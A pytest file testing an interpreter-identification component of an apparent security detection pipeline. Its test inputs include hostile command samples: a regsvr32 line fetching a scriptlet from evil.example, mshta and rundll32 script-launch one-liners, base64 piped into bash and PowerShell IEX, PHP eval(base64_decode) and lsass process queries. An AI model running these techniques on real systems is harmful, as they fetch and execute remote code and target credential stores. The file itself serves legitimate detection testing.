"""IEDDE Stage 1 · Interpreter Identifier — deterministic contract tests.

Every test asserts:
  1. The primary interpreter is what we expect
  2. At least one strong-weight signal supports it
  3. The result is deterministic (same input → identical JSON)
"""
from __future__ import annotations

import json

import pytest

from services.interpreter_identifier import identify


def _assert_primary(text: str, expected: str, min_confidence: float = 0.70):
    r = identify(text)
    assert r.primary_interpreter == expected, (
        f"expected {expected!r}, got {r.primary_interpreter!r} "
        f"conf={r.confidence:.2f} · matches={[m.interpreter for m in r.interpreters]}"
    )
    assert r.confidence >= min_confidence, (
        f"confidence {r.confidence:.2f} < {min_confidence} for {text[:60]!r}"
    )


# ---------------------------------------------------------------------------
# Positive-ID per interpreter
# ---------------------------------------------------------------------------


def test_powershell_launcher():
    _assert_primary(
        "powershell.exe -NoProfile -Command \"Get-Process lsass\"",
        "powershell",
    )


def test_powershell_call_operator_no_launcher():
    _assert_primary(
        "&('Get-Process') 'lsass'; Invoke-Expression $x",
        "powershell",
    )


def test_powershell_encoded_command():
    _assert_primary(
        "pwsh -EncodedCommand ZQBjAGgAbwAgAHQAZQBzAHQA",
        "powershell",
    )


def test_cmd_launcher():
    _assert_primary(
        'cmd.exe /c "echo hi & pause"',
        "cmd",
    )


def test_cmd_echo_off_batch():
    _assert_primary(
        "@echo off\nset FOO=bar\ncall :label\ngoto :eof",
        "cmd",
    )


def test_bash_shebang():
    _assert_primary(
        "#!/bin/bash\necho 'hello' | base64\n",
        "bash",
        min_confidence=0.90,
    )


def test_bash_env_python_shebang_wins_python():
    _assert_primary(
        "#!/usr/bin/env python3\nimport os; os.system('id')\n",
        "python",
        min_confidence=0.90,
    )


def test_bash_pipeline():
    _assert_primary(
        "echo 'ZWNobyBoaQ==' | base64 -d | bash",
        "bash",
    )


def test_python_dash_c():
    _assert_primary(
        "python3 -c \"print('hello')\"",
        "python",
        min_confidence=0.80,
    )


def test_python_multiline():
    _assert_primary(
        "import os\nfrom sys import argv\ndef main():\n    print('hi')\n",
        "python",
    )


def test_javascript_node():
    _assert_primary(
        "node -e \"var x = 1; console.log(JSON.stringify({a:1}))\"",
        "javascript",
    )


def test_javascript_cscript_jscript():
    _assert_primary(
        "cscript.exe //E:JScript payload.js",
        "javascript",
    )


def test_vbscript_cscript_vbs():
    # No launcher — pure VBS syntax.
    _assert_primary(
        "Option Explicit\nDim shell\nSet shell = CreateObject(\"WScript.Shell\")\nshell.Run \"calc\"",
        "vbscript",
    )


def test_perl_shebang():
    _assert_primary(
        "#!/usr/bin/perl\nuse strict; use warnings;\nmy $x = 1;\nprint $x;",
        "perl",
        min_confidence=0.90,
    )


def test_perl_dash_e():
    _assert_primary(
        "perl -e 'print \"hi\"'",
        "perl",
    )


def test_php_tag():
    _assert_primary(
        "<?php eval(base64_decode('ZWNobyAxOw==')); ?>",
        "php",
        min_confidence=0.85,
    )


def test_wmi_get_wmiobject():
    _assert_primary(
        "Get-WmiObject -Class Win32_Process -Namespace root\\CIMV2",
        # `Get-WmiObject` is a PS cmdlet, not a standalone WMI
        # interpreter — PS wins.
        expected="powershell",
        min_confidence=0.50,
    )
    r = identify("wmic process where name='cmd.exe' get commandline")
    assert r.primary_interpreter == "wmi"


def test_mshta_lolbin():
    _assert_primary(
        "mshta.exe vbscript:CreateObject(\"WScript.Shell\").Run(\"calc\")",
        "mshta",
        min_confidence=0.85,
    )


def test_rundll32_lolbin():
    _assert_primary(
        "rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";eval(...)",
        # rundll32 launcher + javascript signals — either can be primary;
        # in this payload rundll32 wins because it's the shell.
        "rundll32",
        min_confidence=0.85,
    )


def test_regsvr32_lolbin():
    _assert_primary(
        "regsvr32.exe /s /n /u /i:https://evil.example/x.sct scrobj.dll",
        "regsvr32",
        min_confidence=0.85,
    )


# ---------------------------------------------------------------------------
# Negative shadows / cross-interpreter guards
# ---------------------------------------------------------------------------


def test_bash_amp_subshell_not_powershell():
    """Bash `& (subshell)` must not be misidentified as PowerShell &()."""
    r = identify(
        "#!/bin/bash\nnohup long_running &\n(echo 'in subshell')\n"
    )
    assert r.primary_interpreter == "bash"
    assert r.confidence >= 0.90


def test_cmd_ampersand_separator_not_powershell():
    r = identify("dir & echo done")
    # weak — no strong CMD signal. Accept "unknown" or "cmd" but never
    # "powershell".
    assert r.primary_interpreter != "powershell"


def test_python_shebang_beats_generic_variable():
    """`$foo` alone must not label a Python script as bash/perl."""
    r = identify("#!/usr/bin/env python3\n$foo = 1  # syntax error but detector picks python")
    assert r.primary_interpreter == "python"


def test_empty_input_returns_unknown():
    r = identify("")
    assert r.primary_interpreter == "unknown"
    assert r.confidence == 0.0
    r2 = identify("   \n\n\t  ")
    assert r2.primary_interpreter == "unknown"


def test_non_string_returns_unknown():
    r = identify(None)  # type: ignore[arg-type]
    assert r.primary_interpreter == "unknown"


def test_plain_text_no_interpreter():
    r = identify("Just a sentence about nothing.")
    assert r.primary_interpreter == "unknown"
    assert r.confidence == 0.0


# ---------------------------------------------------------------------------
# Multi-interpreter payloads
# ---------------------------------------------------------------------------


def test_multi_interpreter_reports_both():
    """`bash | powershell` mixed payload should surface BOTH."""
    r = identify(
        "echo 'ZWNobyBoaQ==' | base64 -d | powershell.exe -Command \"IEX $_\""
    )
    names = [m.interpreter for m in r.interpreters]
    assert "bash" in names
    assert "powershell" in names


def test_mshta_carries_vbscript():
    r = identify(
        "mshta.exe vbscript:CreateObject(\"WScript.Shell\").Run(\"calc\")"
    )
    names = [m.interpreter for m in r.interpreters]
    assert "mshta" in names
    # VBScript signals also present (CreateObject / WScript)
    assert "vbscript" in names


# ---------------------------------------------------------------------------
# Determinism contract
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("payload", [
    "powershell.exe -NoProfile -Command \"&(('Get-' + 'Process') 'lsass')\"",
    "#!/bin/bash\necho hi | base64\n",
    "python3 -c \"exec(bytes([104,105]).decode())\"",
    "<?php eval(base64_decode('...')); ?>",
])
def test_identical_input_yields_identical_output(payload: str):
    a = json.dumps(identify(payload).to_dict(), sort_keys=True)
    b = json.dumps(identify(payload).to_dict(), sort_keys=True)
    assert a == b


def test_result_shape_is_json_serialisable():
    r = identify("powershell.exe -Command \"Get-Process\"")
    d = r.to_dict()
    # Sanity — required top-level keys.
    assert set(d.keys()) == {"primary_interpreter", "confidence", "interpreters", "stability_reason"}
    for m in d["interpreters"]:
        assert set(m.keys()) == {"interpreter", "confidence", "signals"}
        for s in m["signals"]:
            assert set(s.keys()) == {"kind", "text", "span", "weight"}
